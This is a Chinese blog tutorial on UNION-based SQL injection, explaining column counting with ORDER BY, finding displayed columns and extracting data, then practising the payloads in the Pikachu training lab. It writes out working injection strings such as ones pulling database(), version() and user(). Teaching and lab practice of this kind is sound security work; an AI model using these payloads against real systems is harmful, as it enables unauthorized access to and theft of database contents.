
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/test-gang/p/18703720" title="发布于 2025-02-08 14:00">
    <span role="heading" aria-level="2">SQL注入之联合查询注入</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="sql注入之联合查询注入">SQL注入之联合查询注入</h1>
<h2 id="一联合查询注入原理">一、联合查询注入原理</h2>
<p>联合查询注入是一种常见的SQL注入攻击手法，其核心原理是利用SQL中的<code>UNION</code>操作符将多个<code>SELECT</code>语句的结果集合并，从而返回一个统一的结果集。在使用<code>UNION</code>时，必须确保前后两个查询的列数相同，且对应列的数据类型兼容。攻击者通过构造恶意查询，将数据库中的敏感信息（如数据库名称、表名、列名等）与正常查询结果一并输出，从而窃取关键数据。这种攻击方式通常用于探测数据库结构并获取未经授权的信息。</p>
<h2 id="二联合查询注入方法">二、联合查询注入方法</h2>
<p>联合查询注入的方法一共分三步：</p>
<ol>
<li><strong>确定列数</strong>：通过<code>ORDER BY</code>子句利用二分法确定查询的列数（超出列数时会报错）。</li>
<li><strong>确定可显示列</strong>：利用<code>UNION SELECT</code>，将数字或字符串替换到不同列，找出回显数据的列。</li>
<li><strong>获取数据</strong>：构造恶意查询，获取数据库中的敏感信息。</li>
</ol>
<p>例如某个功能的SQL语句如下：</p>
<pre><code class="language-sql">SELECT id, name, age, sex FROM students WHERE name LIKE '%用户输入%'
</code></pre>
<h3 id="确认列数">①确认列数</h3>
<p>我们可以在【用户输入】中输入 <code>1' ORDER BY 4 --</code>，此时 SQL 语句会被拼接为：</p>
<pre><code class="language-sql">SELECT id, name, age, sex FROM students WHERE name LIKE '%1' ORDER BY 4 --%'
</code></pre>
<p>当使用 <code>ORDER BY 4</code> 时，SQL 语句不会报错；然而，当使用 <code>ORDER BY 5</code> 时，SQL 语句会抛出错误：<code>ERROR 1054 (42S22): Unknown column '5' in 'order clause'</code>。</p>
<p>通过观察是否出现报错，我们可以确定查询结果中的列数。</p>
<h3 id="确定可显示列">②确定可显示列</h3>
<p>由于 SQL 查询语句中的字段不会全部显示在页面上或通过接口返回，因此我们需要通过 <code>UNION SELECT</code> 将数字或字符串替换到不同的列，以确定回显数据的位置。</p>
<p>我们可以在【用户输入】中输入 <code>1' UNION SELECT 1, 2, 3, 4 --</code>，此时 SQL 语句会被拼接为：</p>
<pre><code class="language-sql">SELECT id, name, age, sex FROM students WHERE name LIKE '%1' UNION SELECT 1, 2, 3, 4 --%'
</code></pre>
<p>通过观察页面，我们可以查找是否有数据显示为 <code>1</code>、<code>2</code>、<code>3</code> 或 <code>4</code>（如果原本数据中已经存在 <code>1</code>、<code>2</code>、<code>3</code>、<code>4</code>，则可以替换为其他数据）。如果存在，则这些位置即为可显示列。</p>
<h3 id="获取数据">③获取数据</h3>
<p>在找到可显示列后，我们就可以利用这些位置查询所需的数据。例如，假设位置 3 是可显示列，我们可以在【用户输入】中输入 <code>1' UNION SELECT 1, 2, user(), 4 --</code>，此时 SQL 语句会被拼接为：</p>
<pre><code class="language-sql">SELECT id, name, age, sex FROM students WHERE name LIKE '%1' UNION SELECT 1, 2, user(), 4 --%'
</code></pre>
<p>通过这种方式，我们可以在页面上查看到 <code>SELECT user()</code> 的返回内容。</p>
<h2 id="三联合查询注入实例">三、联合查询注入实例</h2>
<p>在Pikachu中，进行实践。</p>
<h3 id="确认列数-1">①确认列数</h3>
<p>在输入框中分别输入以下内容：</p>
<ul>
<li><code>1' order by 3 #</code><br>
<img src="https://img2024.cnblogs.com/blog/2972727/202502/2972727-20250208133754140-110722008.png" alt="image" loading="lazy"></li>
<li><code>1' order by 4 #</code><br>
<img src="https://img2024.cnblogs.com/blog/2972727/202502/2972727-20250208133824902-1627571773.png" alt="image" loading="lazy"></li>
</ul>
<p>通过观察页面响应，可以确认查询结果的列数为 3。</p>
<h3 id="确定可显示列-1">②确定可显示列</h3>
<p>在输入框输入：<code>1' UNION SELECT 1, 2, 3 #</code></p>
<p><img src="https://img2024.cnblogs.com/blog/2972727/202502/2972727-20250208135019335-1831145084.png" alt="image" loading="lazy"></p>
<p>发现三个字段均可显示</p>
<h3 id="获取数据-1">③获取数据</h3>
<p>在输入框输入：<code>1' UNION SELECT database(), version(), user() #</code></p>
<p><img src="https://img2024.cnblogs.com/blog/2972727/202502/2972727-20250208135209985-225696731.png" alt="image" loading="lazy"></p>
<p>随便在某个字段进行查询脱库</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.012175671395833334" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-02-08 14:00">2025-02-08 14:00</span>&nbsp;
<a href="https://www.cnblogs.com/test-gang">测试小罡</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18703720" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18703720);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18703720', targetLink: 'https://www.cnblogs.com/test-gang/p/18703720', title: 'SQL注入之联合查询注入' })">举报</a>
</div>
        